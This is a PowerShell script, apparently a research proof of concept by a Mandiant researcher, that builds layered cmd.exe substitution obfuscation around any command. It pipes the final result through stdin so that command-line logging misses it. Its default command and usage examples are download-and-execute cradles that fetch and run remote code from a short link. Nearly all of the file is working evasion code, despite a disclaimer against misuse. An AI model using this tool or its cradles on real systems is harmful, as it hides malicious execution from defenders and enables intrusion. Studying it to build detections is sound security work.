function Out-FINcodedCommand
{
<#
.SYNOPSIS

Out-FINcodedCommand is a research POC designed to highlight the layered replacement obfuscation functionality that cmd.exe supports.
THIS IS NOT AN ENDORSEMENT FOR ANY FIN GROUPS OR OTHER THREAT ACTORS TO USE THIS TOOL TO PRODUCE PAYLOADS.
DO NOT USE THIS TOOL OR ITS OUTPUT AGAINST ANY SYSTEM THAT YOU ARE NOT AUTHORIZED TO ACCESS.
AKA: Please do not use this tool for evil.

.DESCRIPTION

Out-FINcodedCommand is a research POC designed to highlight the layered replacement obfuscation functionality that cmd.exe supports.

.PARAMETER Command

Specifies the command to obfuscate with FINcoding-style cmd.exe replacement syntax.

.PARAMETER CmdSyntax

Specifies the syntax to reference cmd.exe (otherwise one is randomly assigned from some fun options).

.PARAMETER PowerShellSyntax

Specifies the syntax to reference powershell.exe (otherwise one is randomly assigned from some fun options).

.PARAMETER FinalBinary

Specifies the binary to push the final obfuscated command into via stdin.

.EXAMPLE

C:\PS> Out-FINcodedCommand -Command "iex (iwr http://bit.ly/L3g1t).content"

C:\PS> Out-FINcodedCommand -Command "iex (iwr http://bit.ly/L3g1t).content" -CmdSyntax "%ProgramData:~0,1%%ProgramData:~9,2%" -PowerShellSyntax "%ProgramData:~3,1%%ProgramData:~5,1%we%ProgramData:~7,1%she%Public:~12,1%%Public:~12,1%" -FinalBinary powershell

.NOTES

This is a personal project developed by Daniel Bohannon while an employee at MANDIANT, A FireEye Company.

.LINK

http://www.danielbohannon.com
#>

    [CmdletBinding()]
    param (
        [Parameter(Position = 0, Mandatory = $false)]
        [System.String]
        $Command = "IEX (New-Object Net.WebClient).DownloadString('http://bit.ly/L3g1t')",
        
        [Parameter(Position = 0, Mandatory = $false)]
        [System.String]
        $CmdSyntax = (Get-Random -InputObject @("cmd.exe","cmd","%COMSPEC%","%ProgramData:~0,1%%ProgramData:~9,2%","C:\ProgramData\Microsoft\..\..\Windows\System32\cmd.exe")),
        
        [Parameter(Position = 0, Mandatory = $false)]
        [System.String]
        $PowerShellSyntax = (Get-Random -InputObject @("powershell.exe","powershell","%ProgramData:~3,1%%ProgramData:~5,1%we%ProgramData:~7,1%she%Public:~12,1%%Public:~12,1%","C:\ProgramData\Microsoft\..\..\Windows\System32\WindowsPowerShell\v1.0\powershell.exe")),
        
        [Parameter(Position = 0, Mandatory = $false)]
        [ValidateSet('cmd','powershell')]
        [System.String]
        $FinalBinary = 'powershell'
    )

    # Assign input $CmdSyntax/$PowerShellSyntax for selected $FinalBinary.
    if ($FinalBinary.ToLower() -eq 'powershell')
    {
        # Add - for stdin syntax if 'powershell' was selected for $FinalBinary. This dash is NOT necessary for PS 3.0+.
        $FinalBinarySyntax = $PowerShellSyntax + ' -'
    }
    elseif ($FinalBinary.ToLower() -eq 'cmd')
    {
        $FinalBinarySyntax = $CmdSyntax
    }
    
    # Output input options:
    Write-Host "[*] CmdSyntax          :: " -NoNewLine -ForegroundColor Cyan
    Write-Host $CmdSyntax -ForegroundColor Yellow

    Write-Host "[*] PowerShellSyntax   :: " -NoNewLine -ForegroundColor Cyan
    Write-Host $PowerShellSyntax -ForegroundColor Yellow

    Write-Host "[*] FinalBinarySyntax  :: " -NoNewLine -ForegroundColor Cyan
    Write-Host $FinalBinarySyntax -ForegroundColor Yellow
    
    Write-Host "[*] Command to FINcode :: " -NoNewLine -ForegroundColor Cyan
    Write-Host $Command -ForegroundColor Yellow
    
    # Set $FINcodedCommand to input $Command.
    $FINcodedCommand = $Command

    # Define characters that need to be escaped properly from a cmd.exe perspective. DO NOT MOVE '^' FROM THE FIRST ELEMENT OF $charsToEscape ARRAY! It is there for a reason :)
    $charsToEscape = @('^','&','|')

    # Set a plethora of tags we will use as placeholders for values that will be substituted at the end (mostly) of each iteration.
    $curVarNameTag          = '<CURVARNAMETAG>'
    $lastVarNameTag         = '<LASTVARNAMETAG>'
    $curVarReplaceSyntaxTag = '<VARREPLACESYNTAXTAG>'
    $FINcodedCommandTag     = '<FINCODEDCOMMANDTAG>'
    $escapingTag            = '<ESCAPINGTAG>'

    # Set current syntax for input command with cmd.exe wrapper syntax, handling substitutions and piping final result into cmd.exe via stdin to avoid command line logging for the final deobfuscated command.
    $finalCommand = @("$CmdSyntax /c `"set $curVarNameTag=$FINcodedCommandTag&&$CmdSyntax /c ","","echo %$curVarReplaceSyntaxTag%|$FinalBinarySyntax`"")

    # Keep track of all entered var names so there are not duplicates.
    $allVarNames = @()

    # Keep track of all entered escaped placeholder values to avoid complex replacement errors particular when dealing with numerous layers of escaping.
    $allPlaceholderValues = @()

    $curVarName = $null
    $lastVarName = $null
    $lastVarReplaceSyntax = $null
    $andAnd = '&&'
    $keepEncoding = $true

    # Loop infinitely so as many encoding layers can be added as the user wants. Ctrl+C to exit. This is a POC not a Cadillac.
    while ($keepEncoding)
    {
        # Build out pre-escaped version of FINcodedCommand for all comparison checks leading up to the actual escaping applied at the end of this loop.
        $escapingSyntax = '^' * ([System.Math]::Pow(2,$allVarNames.Count + 2) - 1)
        $FINcodedCommandWithEscaping = $FINcodedCommand.Replace($escapingTag,$escapingSyntax)
        
        Write-Host "`n[*] Enter char/string to FINcode " -NoNewline -ForegroundColor Cyan
        Write-Host "(or Ctrl+C to exit)" -NoNewline -ForegroundColor Yellow
        Write-Host ": " -NoNewline -ForegroundColor Cyan
        $charOrStringToFINcode = Read-Host

        # Perform error handling for user input.
        if (-not $FINcodedCommandWithEscaping.Contains($charOrStringToFINcode))
        {
            Write-Host "[*] ERROR :: Cannot find " -NoNewLine -ForegroundColor Red
            Write-Host $charOrStringToFINcode -NoNewLine -ForegroundColor Yellow
            Write-Host " in your current FINcoded command (remember it's case sensitive)..." -ForegroundColor Red
        }
        else
        {
            # See if escaping needs to occur for any input character(s).
            foreach ($charToEscape in $charsToEscape)
            {
                if ([System.Char[]] $charOrStringToFINcode -contains $charToEscape)
                {
                    # Add escaping tag that will be substituted with the approate layers of escaping.
                    $charOrStringToFINcode = $charOrStringToFINcode.Replace($charToEscape,($escapingSyntax + $charToEscape))
                }
            }
        
            # Loop until user input is valid.
            $keepGettingPlaceholder = $true

            while ($keepGettingPlaceholder)
            {
                Write-Host "[*] Enter char/string for placeholder for above substitution: " -NoNewline -ForegroundColor Cyan
                $placeholder = Read-Host

                # See if escaping needs to occur for any input character(s).
                foreach ($charToEscape in $charsToEscape)
                {
                    if ([System.Char[]] $placeholder -contains $charToEscape)
                    {
                        # Add escaping tag that will be substituted with the approate layers of escaping.
                        $placeholder = $placeholder.Replace($charToEscape,($escapingSyntax + $charToEscape))
                    }
                }
            
                # Check for layered escaping conflict across previous placeholder values stored in $allPlaceholderValues.
                # Example: If first placeholder is "|" (escaped to "^^^|") and the second placeholder is "&|" (escaped to "^^^^^^^&^^^^^^^|") then the first layer replacement of "^^^|" will conflict with the second layer replacement.
                $escapedPlaceholderConflict = $null
                foreach ($prevPlaceholderValue in $allPlaceholderValues)
                {
                    if ($placeholder.Contains($prevPlaceholderValue))
                    {
                        $escapedPlaceholderConflict = $prevPlaceholderValue
                    }
                }

                # Perform error handling for user input.
                if ($FINcodedCommandWithEscaping.ToLower().Contains($placeholder.ToLower()))
                {
                    Write-Host "[*] ERROR :: Selected placeholder " -NoNewLine -ForegroundColor Red
                    Write-Host $placeholder -NoNewLine -ForegroundColor Yellow
                    Write-Host " already exists in your current FINcoded command (cmd.exe replace is case INsensitive)..." -ForegroundColor Red
                }
                elseif ( ($charOrStringToFINcode.Length -gt 0) -and ($FINcodedCommandWithEscaping -ne $FINcodedCommandWithEscaping.Replace($charOrStringToFINcode,$placeholder).Replace($placeholder,$charOrStringToFINcode)) )
                {
                    # Example: In "Object" replacing "je" with "bb" will result in "Obbbct".
                    #          When the replace is performed it will match on the first instance of "bb" resulting in the incorrect "Ojebct".
                    Write-Host "[*] ERROR :: Placeholder " -NoNewLine -ForegroundColor Red
                    Write-Host $placeholder -NoNewLine -ForegroundColor Yellow
                    Write-Host " substitution will cause incorrect dubious replacement due to adjacent text after substitution..." -ForegroundColor Red
                }
                elseif ($escapedPlaceholderConflict)
                {
                    # Example: If first placeholder is "|" (escaped to "^^^|") and the second placeholder is "&|" (escaped to "^^^^^^^&^^^^^^^|") then the first layer replacement of "^^^|" will conflict with the second layer replacement.
                    Write-Host "[*] ERROR :: Placeholder " -NoNewLine -ForegroundColor Red
                    Write-Host $placeholder -NoNewLine -ForegroundColor Yellow
                    Write-Host " conflicts with previously escaped placeholder " -NoNewLine -ForegroundColor Red
                    Write-Host $escapedPlaceholderConflict -NoNewLine -ForegroundColor Yellow
                    Write-Host "..." -ForegroundColor Red
                }
                else
                {
                    $allPlaceholderValues += $placeholder
                    $keepGettingPlaceholder = $false
                }
            }

            # Update original FINcodedCommand with most recent substitution.
            if ($charOrStringToFINcode.Length -gt 0)
            {
                $FINcodedCommand = $FINcodedCommandWithEscaping.Replace($charOrStringToFINcode,$placeholder)
            }
        
            # Keep track of previous and current var names.
            $lastVarName = $curVarName

            # Loop until user input is valid.
            $keepReadingInput = $true

            while ($keepReadingInput)
            {
                Write-Host "[*] Enter variable name to store this layer of substitution: " -NoNewline -ForegroundColor Cyan
                $curVarName = Read-Host

                # Perform error handling for user input.
                if ($allVarNames -notcontains $curVarName)
                {
                    $keepReadingInput = $false
                    $allVarNames += $curVarName
                }
                else
                {
                    Write-Host "[*] ERROR :: You have already used " -NoNewLine -ForegroundColor Red
                    Write-Host $curVarName -NoNewLine -ForegroundColor Yellow
                    Write-Host " as a variable name -- duplicates are not allowed..." -ForegroundColor Red
                }
            }
        
            # Update current cmd.exe wrapper syntax for current FINcoded command.

            $curVarReplaceSyntax = "$curVarName`:$placeholder=$charOrStringToFINcode"

            if ($allVarNames.Count -eq 1)
            {
                # Update appropriate $finalCommand array elements.
                $finalCommand[0] = $finalCommand[0].Replace($curVarNameTag,$curVarName)
                $finalCommand[2] = $finalCommand[2].Replace($curVarReplaceSyntaxTag,$curVarReplaceSyntax)
            }
            else
            {
                # Handle levels of escaping for cmd.exe's && syntax.
                $andAnd = -join ( [System.Char[]] $andAnd | ForEach-Object { "^$_" } )

                # Update appropriate $finalCommand array elements.
                $finalCommand[0] = $finalCommand[0].Replace($curVarNameTag,$curVarName)
                $finalCommand[1] += "set $curVarName=%$lastVarReplaceSyntax% $andAnd$CmdSyntax /c "
                $finalCommand[2] = "echo %$curVarReplaceSyntax%|$FinalBinarySyntax`""
            }
        
            # Keep track of last variable replace syntax for next iteration.
            $lastVarReplaceSyntax = $curVarReplaceSyntax

            # Assemble final FINcoded command for current iteration.
            $finalFINcodedCommand = $finalCommand[0].Replace($FINcodedCommandTag,$FINcodedCommand) + $finalCommand[1] + $finalCommand[2]

            # Perform substitutions for all necessary levels of escaping.
            $escapingSyntax = '^' * ([System.Math]::Pow(2,$allVarNames.Count) - 1)

            # Copy current FINcoded command result to clipboard.
            $finalFINcodedCommand | C:\Windows\System32\clip.exe

            # Output result in classic DBO fasion: Write-Host + lots of colors.
            $FINcodedCommandIndex = $finalFINcodedCommand.IndexOf($FINcodedCommand)
            Write-Host "`n[*] Current FINcoded command (copied to clipboard):" -ForegroundColor Cyan
            Write-Host "    $($finalFINcodedCommand.Substring(0,$FINcodedCommandIndex))" -NoNewLine -ForegroundColor Green
            Write-Host $FINcodedCommand -NoNewLine -ForegroundColor Yellow
            Write-Host $finalFINcodedCommand.Substring($FINcodedCommandIndex + $FINcodedCommand.Length) -ForegroundColor Green
        }
    }
}